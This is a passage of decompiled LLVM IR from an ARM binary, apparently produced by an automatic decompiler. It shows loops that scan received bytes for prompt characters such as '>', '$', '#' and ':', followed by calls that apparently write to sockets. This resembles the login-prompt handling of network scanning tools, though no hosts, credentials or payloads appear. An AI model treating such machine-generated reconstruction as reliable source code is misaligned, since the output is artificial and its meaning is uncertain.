  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11158 = load i32, i32* @r6, align 4
  %v1_11158 = add i32 %v0_11158, 4
  %v2_11158 = inttoptr i32 %v1_11158 to i32*
  %v3_11158 = load i32, i32* %v2_11158, align 4
  store i32 %v3_11158, i32* @r0, align 4
  %v4_1115c = call i32 @function_14a74(i32 %v3_11158, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11164 = call i32 @function_119f4(i32 22)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_1116c = load i32, i32* @r6, align 4
  %v2_1116c = add i32 %v1_1116c, 12
  %v3_1116c = inttoptr i32 %v2_1116c to i32*
  store i32 7, i32* %v3_1116c, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_11174:                               ; preds = %dec_label_pc_10c9c
  %v1_11174 = add i32 %v0_10c9c, 24
  %v2_11174 = inttoptr i32 %v1_11174 to i32*
  %v3_11174 = load i32, i32* %v2_11174, align 4
  store i32 %v3_11174, i32* %r2.global-to-local, align 4
  %v1_11178 = add i32 %v3_11174, -1
  store i32 %v1_11178, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1117c = icmp eq i32 %v1_11178, 0
  store i1 %v2_1117c, i1* %cpsr_z.global-to-local, align 1
  %tmp358 = icmp slt i32 %v1_11178, 1
  br i1 %tmp358, label %dec_label_pc_10c1cthread-pre-split.thread, label %dec_label_pc_11184

dec_label_pc_11184:                               ; preds = %dec_label_pc_11174
  %v2_11184 = add i32 %v1_11178, %v0_10c9c
  store i32 %v2_11184, i32* %r3.global-to-local, align 4
  %v1_11188 = add i32 %v2_11184, 28
  %v2_11188 = inttoptr i32 %v1_11188 to i8*
  %v3_11188 = load i8, i8* %v2_11188, align 1
  %v4_11188 = zext i8 %v3_11188 to i32
  store i32 %v4_11188, i32* %r3.global-to-local, align 4
  %v2_1118c = icmp ugt i8 %v3_11188, 61
  store i1 %v2_1118c, i1* %cpsr_c.global-to-local, align 1
  %v7_1118c = icmp eq i8 %v3_11188, 62
  store i1 %v7_1118c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1118c, label %dec_label_pc_111f0, label %bb359

bb359:                                            ; preds = %dec_label_pc_11184
  %v3_11190 = icmp ugt i8 %v3_11188, 57
  store i1 %v3_11190, i1* %cpsr_c.global-to-local, align 1
  %v8_11190 = icmp eq i8 %v3_11188, 58
  store i1 %v8_11190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11190, label %dec_label_pc_111f0, label %dec_label_pc_11198

dec_label_pc_11198:                               ; preds = %bb359
  %v2_11198 = icmp ugt i8 %v3_11188, 35
  store i1 %v2_11198, i1* %cpsr_c.global-to-local, align 1
  %v7_11198 = icmp eq i8 %v3_11188, 36
  store i1 %v7_11198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11198, label %dec_label_pc_111f0, label %dec_label_pc_111a0

dec_label_pc_111a0:                               ; preds = %dec_label_pc_11198
  %v2_111a0 = icmp ugt i8 %v3_11188, 34
  store i1 %v2_111a0, i1* %cpsr_c.global-to-local, align 1
  %v7_111a0 = icmp eq i8 %v3_11188, 35
  store i1 %v7_111a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111a0, label %dec_label_pc_111f0, label %dec_label_pc_111a8

dec_label_pc_111a8:                               ; preds = %dec_label_pc_111a0
  %v2_111a8 = icmp ugt i8 %v3_11188, 36
  store i1 %v2_111a8, i1* %cpsr_c.global-to-local, align 1
  %v7_111a8 = icmp eq i8 %v3_11188, 37
  store i1 %v7_111a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111a8, label %dec_label_pc_111f0, label %dec_label_pc_111d8.preheader

dec_label_pc_111d8.preheader:                     ; preds = %dec_label_pc_111a8
  %v3_111ac = add i32 %v0_10c9c, 28
  %v2_111b0 = add i32 %v3_111ac, %v3_11174
  store i32 %v2_111b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_111d8

dec_label_pc_111bc:                               ; preds = %bb360
  %v2_111bc = icmp ugt i8 %v3_111e0, 35
  store i1 %v2_111bc, i1* %cpsr_c.global-to-local, align 1
  %v7_111bc = icmp eq i8 %v3_111e0, 36
  store i1 %v7_111bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111bc, label %dec_label_pc_111f0, label %dec_label_pc_111c4

dec_label_pc_111c4:                               ; preds = %dec_label_pc_111bc
  %v2_111c4 = icmp ugt i8 %v3_111e0, 34
  store i1 %v2_111c4, i1* %cpsr_c.global-to-local, align 1
  %v7_111c4 = icmp eq i8 %v3_111e0, 35
  store i1 %v7_111c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111c4, label %dec_label_pc_111f0, label %dec_label_pc_111cc

dec_label_pc_111cc:                               ; preds = %dec_label_pc_111c4
  %v2_111cc = icmp ugt i8 %v3_111e0, 36
  store i1 %v2_111cc, i1* %cpsr_c.global-to-local, align 1
  %v7_111cc = icmp eq i8 %v3_111e0, 37
  store i1 %v7_111cc, i1* %cpsr_z.global-to-local, align 1
  %v1_111d0 = add i32 %v0_111d0, -1
  store i32 %v1_111d0, i32* %r3.global-to-local, align 4
  br i1 %v7_111cc, label %dec_label_pc_111f0, label %dec_label_pc_111d8

dec_label_pc_111d8:                               ; preds = %dec_label_pc_111d8.preheader, %dec_label_pc_111cc
  %v0_111d0 = phi i32 [ %v2_111b0, %dec_label_pc_111d8.preheader ], [ %v1_111d0, %dec_label_pc_111cc ]
  %v0_111d8 = phi i32 [ %v1_11178, %dec_label_pc_111d8.preheader ], [ %v1_111d8, %dec_label_pc_111cc ]
  %v1_111d8 = add i32 %v0_111d8, -1
  store i32 %v1_111d8, i32* %r1.global-to-local, align 4
  %v2_111d8 = icmp ne i32 %v0_111d8, 0
  store i1 %v2_111d8, i1* %cpsr_c.global-to-local, align 1
  %v7_111d8 = icmp eq i32 %v0_111d8, 1
  store i1 %v7_111d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111d8, label %dec_label_pc_10c1cthread-pre-split.thread477, label %dec_label_pc_111e0

dec_label_pc_111e0:                               ; preds = %dec_label_pc_111d8
  %v1_111e0 = add i32 %v0_111d0, -2
  %v2_111e0 = inttoptr i32 %v1_111e0 to i8*
  %v3_111e0 = load i8, i8* %v2_111e0, align 1
  %v4_111e0 = zext i8 %v3_111e0 to i32
  store i32 %v4_111e0, i32* %r2.global-to-local, align 4
  %v2_111e4 = icmp ugt i8 %v3_111e0, 61
  store i1 %v2_111e4, i1* %cpsr_c.global-to-local, align 1
  %v7_111e4 = icmp eq i8 %v3_111e0, 62
  store i1 %v7_111e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111e4, label %dec_label_pc_111f0, label %bb360

bb360:                                            ; preds = %dec_label_pc_111e0
  %v3_111e8 = icmp ugt i8 %v3_111e0, 57
  store i1 %v3_111e8, i1* %cpsr_c.global-to-local, align 1
  %v8_111e8 = icmp eq i8 %v3_111e0, 58
  store i1 %v8_111e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_111e8, label %dec_label_pc_111f0, label %dec_label_pc_111bc

dec_label_pc_111f0:                               ; preds = %dec_label_pc_111e0, %bb360, %dec_label_pc_111cc, %dec_label_pc_111c4, %dec_label_pc_111bc, %dec_label_pc_111a8, %dec_label_pc_11184, %dec_label_pc_111a0, %dec_label_pc_11198, %bb359
  %v0_111f4 = phi i32 [ %v1_11178, %dec_label_pc_111a8 ], [ %v1_11178, %dec_label_pc_11184 ], [ %v1_11178, %dec_label_pc_111a0 ], [ %v1_11178, %dec_label_pc_11198 ], [ %v1_11178, %bb359 ], [ %v1_111d8, %dec_label_pc_111bc ], [ %v1_111d8, %dec_label_pc_111c4 ], [ %v1_111d8, %dec_label_pc_111cc ], [ %v1_111d8, %bb360 ], [ %v1_111d8, %dec_label_pc_111e0 ]
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_111f4 = add i32 %v0_111f4, 1
  store i32 %v1_111f4, i32* @r7, align 4
  %v1_111f8 = call i32 @function_11a94(i32 23)
  store i32 %v2_112d4, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_11208 = call i32 @function_119d0(i32 23, i32* nonnull %stack_var_-60)
  store i32 %v3_11208, i32* %r0.global-to-local, align 4
  %v3_1120c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_1120c, i32* @r2, align 4
  store i32 %v3_11208, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11218 = load i32, i32* @r6, align 4
  %v1_11218 = add i32 %v0_11218, 4
  %v2_11218 = inttoptr i32 %v1_11218 to i32*
  %v3_11218 = load i32, i32* %v2_11218, align 4
  store i32 %v3_11218, i32* @r0, align 4
  %v4_1121c = call i32 @function_14a74(i32 %v3_11218, i32 %v3_11208, i32 %v3_1120c, i32 16384)
  store i32 %v4_1121c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1122c = load i32, i32* @r6, align 4
  %v1_1122c = add i32 %v0_1122c, 4
  %v2_1122c = inttoptr i32 %v1_1122c to i32*
  %v3_1122c = load i32, i32* %v2_1122c, align 4
  store i32 %v3_1122c, i32* @r0, align 4
  %v4_11230 = call i32 @function_14a74(i32 %v3_1122c, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_11238 = call i32 @function_119f4(i32 23)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_11240 = load i32, i32* @r6, align 4
  %v2_11240 = add i32 %v1_11240, 12
  %v3_11240 = inttoptr i32 %v2_11240 to i32*
  store i32 9, i32* %v3_11240, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_11248:                               ; preds = %dec_label_pc_10c9c
  %v1_11248 = add i32 %v0_10c9c, 24
  %v2_11248 = inttoptr i32 %v1_11248 to i32*
  %v3_11248 = load i32, i32* %v2_11248, align 4
  store i32 %v3_11248, i32* %r2.global-to-local, align 4
  %v1_1124c = add i32 %v3_11248, -1
  store i32 %v1_1124c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11250 = icmp eq i32 %v1_1124c, 0
  store i1 %v2_11250, i1* %cpsr_z.global-to-local, align 1
  %tmp361 = icmp slt i32 %v1_1124c, 1
  br i1 %tmp361, label %dec_label_pc_10c1cthread-pre-split.thread, label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %dec_label_pc_11248
  %v2_11258 = add i32 %v1_1124c, %v0_10c9c
  store i32 %v2_11258, i32* %r3.global-to-local, align 4
  %v1_1125c = add i32 %v2_11258, 28
  %v2_1125c = inttoptr i32 %v1_1125c to i8*
  %v3_1125c = load i8, i8* %v2_1125c, align 1
  %v4_1125c = zext i8 %v3_1125c to i32
  store i32 %v4_1125c, i32* %r3.global-to-local, align 4
  %v2_11260 = icmp ugt i8 %v3_1125c, 61
  store i1 %v2_11260, i1* %cpsr_c.global-to-local, align 1
  %v7_11260 = icmp eq i8 %v3_1125c, 62
  store i1 %v7_11260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11260, label %dec_label_pc_112c4, label %bb362

bb362:                                            ; preds = %dec_label_pc_11258
  %v3_11264 = icmp ugt i8 %v3_1125c, 57
  store i1 %v3_11264, i1* %cpsr_c.global-to-local, align 1
  %v8_11264 = icmp eq i8 %v3_1125c, 58
  store i1 %v8_11264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11264, label %dec_label_pc_112c4, label %dec_label_pc_1126c

dec_label_pc_1126c:                               ; preds = %bb362
  %v2_1126c = icmp ugt i8 %v3_1125c, 35
  store i1 %v2_1126c, i1* %cpsr_c.global-to-local, align 1
  %v7_1126c = icmp eq i8 %v3_1125c, 36
  store i1 %v7_1126c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1126c, label %dec_label_pc_112c4, label %dec_label_pc_11274

dec_label_pc_11274:                               ; preds = %dec_label_pc_1126c
  %v2_11274 = icmp ugt i8 %v3_1125c, 34
  store i1 %v2_11274, i1* %cpsr_c.global-to-local, align 1
  %v7_11274 = icmp eq i8 %v3_1125c, 35
  store i1 %v7_11274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11274, label %dec_label_pc_112c4, label %dec_label_pc_1127c

dec_label_pc_1127c:                               ; preds = %dec_label_pc_11274
  %v2_1127c = icmp ugt i8 %v3_1125c, 36
  store i1 %v2_1127c, i1* %cpsr_c.global-to-local, align 1
  %v7_1127c = icmp eq i8 %v3_1125c, 37
  store i1 %v7_1127c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1127c, label %dec_label_pc_112c4, label %dec_label_pc_112ac.preheader

dec_label_pc_112ac.preheader:                     ; preds = %dec_label_pc_1127c
  %v3_11280 = add i32 %v0_10c9c, 28
  %v2_11284 = add i32 %v3_11280, %v3_11248
  store i32 %v2_11284, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_112ac

dec_label_pc_11290:                               ; preds = %bb363
  %v2_11290 = icmp ugt i8 %v3_112b4, 35
  store i1 %v2_11290, i1* %cpsr_c.global-to-local, align 1
  %v7_11290 = icmp eq i8 %v3_112b4, 36
  store i1 %v7_11290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11290, label %dec_label_pc_112c4, label %dec_label_pc_11298

dec_label_pc_11298:                               ; preds = %dec_label_pc_11290
  %v2_11298 = icmp ugt i8 %v3_112b4, 34
  store i1 %v2_11298, i1* %cpsr_c.global-to-local, align 1
  %v7_11298 = icmp eq i8 %v3_112b4, 35
  store i1 %v7_11298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11298, label %dec_label_pc_112c4, label %dec_label_pc_112a0

dec_label_pc_112a0:                               ; preds = %dec_label_pc_11298
  %v2_112a0 = icmp ugt i8 %v3_112b4, 36
  store i1 %v2_112a0, i1* %cpsr_c.global-to-local, align 1
  %v7_112a0 = icmp eq i8 %v3_112b4, 37
  store i1 %v7_112a0, i1* %cpsr_z.global-to-local, align 1
  %v1_112a4 = add i32 %v0_112a4, -1
  store i32 %v1_112a4, i32* %r3.global-to-local, align 4
  br i1 %v7_112a0, label %dec_label_pc_112c4, label %dec_label_pc_112ac

dec_label_pc_112ac:                               ; preds = %dec_label_pc_112ac.preheader, %dec_label_pc_112a0
  %v0_112a4 = phi i32 [ %v2_11284, %dec_label_pc_112ac.preheader ], [ %v1_112a4, %dec_label_pc_112a0 ]
  %v0_112ac = phi i32 [ %v1_1124c, %dec_label_pc_112ac.preheader ], [ %v1_112ac, %dec_label_pc_112a0 ]
  %v1_112ac = add i32 %v0_112ac, -1
  store i32 %v1_112ac, i32* %r1.global-to-local, align 4
  %v2_112ac = icmp ne i32 %v0_112ac, 0
  store i1 %v2_112ac, i1* %cpsr_c.global-to-local, align 1
  %v7_112ac = icmp eq i32 %v0_112ac, 1
  store i1 %v7_112ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112ac, label %dec_label_pc_10c1cthread-pre-split.thread477, label %dec_label_pc_112b4

dec_label_pc_112b4:                               ; preds = %dec_label_pc_112ac
  %v1_112b4 = add i32 %v0_112a4, -2
  %v2_112b4 = inttoptr i32 %v1_112b4 to i8*
  %v3_112b4 = load i8, i8* %v2_112b4, align 1
  %v4_112b4 = zext i8 %v3_112b4 to i32
  store i32 %v4_112b4, i32* %r2.global-to-local, align 4
  %v2_112b8 = icmp ugt i8 %v3_112b4, 61
  store i1 %v2_112b8, i1* %cpsr_c.global-to-local, align 1
  %v7_112b8 = icmp eq i8 %v3_112b4, 62
  store i1 %v7_112b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112b8, label %dec_label_pc_112c4, label %bb363

bb363:                                            ; preds = %dec_label_pc_112b4
  %v3_112bc = icmp ugt i8 %v3_112b4, 57
  store i1 %v3_112bc, i1* %cpsr_c.global-to-local, align 1
  %v8_112bc = icmp eq i8 %v3_112b4, 58
  store i1 %v8_112bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112bc, label %dec_label_pc_112c4, label %dec_label_pc_11290

dec_label_pc_112c4:                               ; preds = %dec_label_pc_112b4, %bb363, %dec_label_pc_112a0, %dec_label_pc_11298, %dec_label_pc_11290, %dec_label_pc_1127c, %dec_label_pc_11258, %dec_label_pc_11274, %dec_label_pc_1126c, %bb362
  %v0_112c8 = phi i32 [ %v1_1124c, %dec_label_pc_1127c ], [ %v1_1124c, %dec_label_pc_11258 ], [ %v1_1124c, %dec_label_pc_11274 ], [ %v1_1124c, %dec_label_pc_1126c ], [ %v1_1124c, %bb362 ], [ %v1_112ac, %dec_label_pc_11290 ], [ %v1_112ac, %dec_label_pc_11298 ], [ %v1_112ac, %dec_label_pc_112a0 ], [ %v1_112ac, %bb363 ], [ %v1_112ac, %dec_label_pc_112b4 ]
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_112c8 = add i32 %v0_112c8, 1
  store i32 %v1_112c8, i32* @r7, align 4
  %v1_112cc = call i32 @function_11a94(i32 21)
  store i32 %v2_112d4, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_112dc = call i32 @function_119d0(i32 21, i32* nonnull %stack_var_-60)
  store i32 %v3_112dc, i32* %r0.global-to-local, align 4
  %v3_112e0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_112e0, i32* @r2, align 4
  store i32 %v3_112dc, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_112ec = load i32, i32* @r6, align 4
  %v1_112ec = add i32 %v0_112ec, 4
  %v2_112ec = inttoptr i32 %v1_112ec to i32*
  %v3_112ec = load i32, i32* %v2_112ec, align 4
  store i32 %v3_112ec, i32* @r0, align 4
  %v4_112f0 = call i32 @function_14a74(i32 %v3_112ec, i32 %v3_112dc, i32 %v3_112e0, i32 16384)
  store i32 %v4_112f0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11300 = load i32, i32* @r6, align 4
  %v1_11300 = add i32 %v0_11300, 4
  %v2_11300 = inttoptr i32 %v1_11300 to i32*
  %v3_11300 = load i32, i32* %v2_11300, align 4
  store i32 %v3_11300, i32* @r0, align 4
  %v4_11304 = call i32 @function_14a74(i32 %v3_11300, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_1130c = call i32 @function_119f4(i32 21)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_11314 = load i32, i32* @r6, align 4
  %v2_11314 = add i32 %v1_11314, 12
  %v3_11314 = inttoptr i32 %v2_11314 to i32*
  store i32 6, i32* %v3_11314, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_1131c:                               ; preds = %dec_label_pc_10c9c
  %v1_1131c = add i32 %v0_10c9c, 24
  %v2_1131c = inttoptr i32 %v1_1131c to i32*
  %v3_1131c = load i32, i32* %v2_1131c, align 4
  store i32 %v3_1131c, i32* %r1.global-to-local, align 4
  %v1_11320 = add i32 %v3_1131c, -1
  store i32 %v1_11320, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11324 = icmp eq i32 %v1_11320, 0
  store i1 %v2_11324, i1* %cpsr_z.global-to-local, align 1
  %tmp364 = icmp slt i32 %v1_11320, 1
  br i1 %tmp364, label %dec_label_pc_11398, label %dec_label_pc_1132c

dec_label_pc_1132c:                               ; preds = %dec_label_pc_1131c
  %v2_1132c = add i32 %v1_11320, %v0_10c9c
  store i32 %v2_1132c, i32* %r3.global-to-local, align 4
  %v1_11330 = add i32 %v2_1132c, 28
  %v2_11330 = inttoptr i32 %v1_11330 to i8*
  %v3_11330 = load i8, i8* %v2_11330, align 1
  %v4_11330 = zext i8 %v3_11330 to i32
  store i32 %v4_11330, i32* %r3.global-to-local, align 4
  %v2_11334 = icmp ugt i8 %v3_11330, 61
  store i1 %v2_11334, i1* %cpsr_c.global-to-local, align 1
  %v7_11334 = icmp eq i8 %v3_11330, 62
  store i1 %v7_11334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11334, label %dec_label_pc_115a0, label %bb365

bb365:                                            ; preds = %dec_label_pc_1132c
  %v3_11338 = icmp ugt i8 %v3_11330, 57
  store i1 %v3_11338, i1* %cpsr_c.global-to-local, align 1
  %v8_11338 = icmp eq i8 %v3_11330, 58
  store i1 %v8_11338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11338, label %dec_label_pc_115a0, label %dec_label_pc_11340

dec_label_pc_11340:                               ; preds = %bb365
  %v2_11340 = icmp ugt i8 %v3_11330, 35
  store i1 %v2_11340, i1* %cpsr_c.global-to-local, align 1
  %v7_11340 = icmp eq i8 %v3_11330, 36
  store i1 %v7_11340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11340, label %dec_label_pc_115a0, label %dec_label_pc_11348

dec_label_pc_11348:                               ; preds = %dec_label_pc_11340
  %v2_11348 = icmp ugt i8 %v3_11330, 34
  store i1 %v2_11348, i1* %cpsr_c.global-to-local, align 1
  %v7_11348 = icmp eq i8 %v3_11330, 35
  store i1 %v7_11348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11348, label %dec_label_pc_115a0, label %dec_label_pc_11350

dec_label_pc_11350:                               ; preds = %dec_label_pc_11348
  %v2_11350 = icmp ugt i8 %v3_11330, 36
  store i1 %v2_11350, i1* %cpsr_c.global-to-local, align 1
  %v7_11350 = icmp eq i8 %v3_11330, 37
  store i1 %v7_11350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11350, label %dec_label_pc_115a0, label %dec_label_pc_11390.preheader

dec_label_pc_11390.preheader:                     ; preds = %dec_label_pc_11350
  %v3_11354 = add i32 %v0_10c9c, 28
  %v2_11358 = add i32 %v3_11354, %v3_1131c
  store i32 %v2_11358, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11390

dec_label_pc_11364:                               ; preds = %dec_label_pc_11390
  %v1_11364 = add i32 %v0_11388, -2
  %v2_11364 = inttoptr i32 %v1_11364 to i8*
  %v3_11364 = load i8, i8* %v2_11364, align 1
  %v4_11364 = zext i8 %v3_11364 to i32
  store i32 %v4_11364, i32* %r2.global-to-local, align 4
  %v2_11368 = icmp ugt i8 %v3_11364, 61
  store i1 %v2_11368, i1* %cpsr_c.global-to-local, align 1
  %v7_11368 = icmp eq i8 %v3_11364, 62
  store i1 %v7_11368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11368, label %dec_label_pc_115a0, label %bb366

bb366:                                            ; preds = %dec_label_pc_11364
  %v3_1136c = icmp ugt i8 %v3_11364, 57
  store i1 %v3_1136c, i1* %cpsr_c.global-to-local, align 1
  %v8_1136c = icmp eq i8 %v3_11364, 58
  store i1 %v8_1136c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1136c, label %dec_label_pc_115a0, label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %bb366
  %v2_11374 = icmp ugt i8 %v3_11364, 35
  store i1 %v2_11374, i1* %cpsr_c.global-to-local, align 1
  %v7_11374 = icmp eq i8 %v3_11364, 36
  store i1 %v7_11374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11374, label %dec_label_pc_115a0, label %dec_label_pc_1137c

dec_label_pc_1137c:                               ; preds = %dec_label_pc_11374
  %v2_1137c = icmp ugt i8 %v3_11364, 34
  store i1 %v2_1137c, i1* %cpsr_c.global-to-local, align 1
  %v7_1137c = icmp eq i8 %v3_11364, 35
  store i1 %v7_1137c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1137c, label %dec_label_pc_115a0, label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %dec_label_pc_1137c
  %v2_11384 = icmp ugt i8 %v3_11364, 36
  store i1 %v2_11384, i1* %cpsr_c.global-to-local, align 1
  %v7_11384 = icmp eq i8 %v3_11364, 37
  store i1 %v7_11384, i1* %cpsr_z.global-to-local, align 1
  %v1_11388 = add i32 %v0_11388, -1
  store i32 %v1_11388, i32* %r3.global-to-local, align 4
  br i1 %v7_11384, label %dec_label_pc_115a0, label %dec_label_pc_11390

dec_label_pc_11390:                               ; preds = %dec_label_pc_11390.preheader, %dec_label_pc_11384
  %v0_11388 = phi i32 [ %v2_11358, %dec_label_pc_11390.preheader ], [ %v1_11388, %dec_label_pc_11384 ]
  %v0_11390 = phi i32 [ %v1_11320, %dec_label_pc_11390.preheader ], [ %v1_11390, %dec_label_pc_11384 ]
  %v1_11390 = add i32 %v0_11390, -1
  store i32 %v1_11390, i32* %r0.global-to-local, align 4
  %v2_11390 = icmp ne i32 %v0_11390, 0
  store i1 %v2_11390, i1* %cpsr_c.global-to-local, align 1
  %v7_11390 = icmp eq i32 %v0_11390, 1
  store i1 %v7_11390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11390, label %dec_label_pc_11398, label %dec_label_pc_11364

dec_label_pc_11398:                               ; preds = %dec_label_pc_11390, %dec_label_pc_1131c
  %v0_11398 = load i32, i32* @fp, align 4
  store i32 %v0_11398, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19a14.326 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_113a4 = call i32 @function_123dc(i32 %v0_11398, i32 %v3_1131c, i32 ptrtoint ([5 x i8]* @global_var_19a14.326 to i32), i32 4)
  store i32 %v5_113a4, i32* %r0.global-to-local, align 4
  %v2_113a8 = icmp eq i32 %v5_113a4, -1
  store i1 %v2_113a8, i1* %cpsr_c.global-to-local, align 1
  %v7_113a8 = icmp eq i32 %v5_113a4, -1
  store i1 %v7_113a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_113a4, i32* @r7, align 4
  br i1 %v7_113a8, label %dec_label_pc_1197c, label %dec_label_pc_113b4

dec_label_pc_113b4:                               ; preds = %dec_label_pc_1197c, %dec_label_pc_11398
  %v0_113b4 = phi i32 [ %v5_1198c, %dec_label_pc_1197c ], [ %v5_113a4, %dec_label_pc_11398 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113b4 = icmp eq i32 %v0_113b4, 0
  store i1 %v2_113b4, i1* %cpsr_z.global-to-local, align 1
  %v5_113b8 = icmp sgt i32 %v0_113b4, 0
  br i1 %v5_113b8, label %dec_label_pc_113b4.dec_label_pc_115a4_crit_edge, label %dec_label_pc_113bc

dec_label_pc_113b4.dec_label_pc_115a4_crit_edge:  ; preds = %dec_label_pc_113b4
  %v0_115a4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_115a4

dec_label_pc_113bc:                               ; preds = %dec_label_pc_1151c, %bb374, %dec_label_pc_11450, %dec_label_pc_113b4, %dec_label_pc_11664, %dec_label_pc_115e0, %dec_label_pc_115a4, %dec_label_pc_116ec
  %v0_113bc = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113bc = icmp eq i32 %v0_113bc, 0
  store i1 %v2_113bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113bc, label %dec_label_pc_10c18.loopexit, label %dec_label_pc_10dcc

dec_label_pc_113c8:                               ; preds = %dec_label_pc_10c9c
  %v1_113c8 = add i32 %v0_10c9c, 24
  %v2_113c8 = inttoptr i32 %v1_113c8 to i32*
  %v3_113c8 = load i32, i32* %v2_113c8, align 4
  store i32 %v3_113c8, i32* %r1.global-to-local, align 4
  %v1_113cc = add i32 %v3_113c8, -1
  store i32 %v1_113cc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113d0 = icmp eq i32 %v1_113cc, 0
  store i1 %v2_113d0, i1* %cpsr_z.global-to-local, align 1
  %tmp367 = icmp slt i32 %v1_113cc, 1
  br i1 %tmp367, label %dec_label_pc_11434, label %dec_label_pc_113d8

dec_label_pc_113d8:                               ; preds = %dec_label_pc_113c8
  %v2_113d8 = add i32 %v1_113cc, %v0_10c9c
  store i32 %v2_113d8, i32* %r3.global-to-local, align 4
  %v1_113dc = add i32 %v2_113d8, 28
  %v2_113dc = inttoptr i32 %v1_113dc to i8*
  %v3_113dc = load i8, i8* %v2_113dc, align 1
  %v4_113dc = zext i8 %v3_113dc to i32
  store i32 %v4_113dc, i32* %r3.global-to-local, align 4
  %v2_113e0 = icmp ugt i8 %v3_113dc, 61
  store i1 %v2_113e0, i1* %cpsr_c.global-to-local, align 1
  %v7_113e0 = icmp eq i8 %v3_113dc, 62
  store i1 %v7_113e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113e0, label %dec_label_pc_115dc, label %bb368

bb368:                                            ; preds = %dec_label_pc_113d8
  %v3_113e4 = icmp ugt i8 %v3_113dc, 57
  store i1 %v3_113e4, i1* %cpsr_c.global-to-local, align 1
  %v8_113e4 = icmp eq i8 %v3_113dc, 58
  store i1 %v8_113e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_113e4, label %dec_label_pc_115dc, label %dec_label_pc_113ec

dec_label_pc_113ec:                               ; preds = %bb368
  %v2_113ec = icmp ugt i8 %v3_113dc, 35
  store i1 %v2_113ec, i1* %cpsr_c.global-to-local, align 1
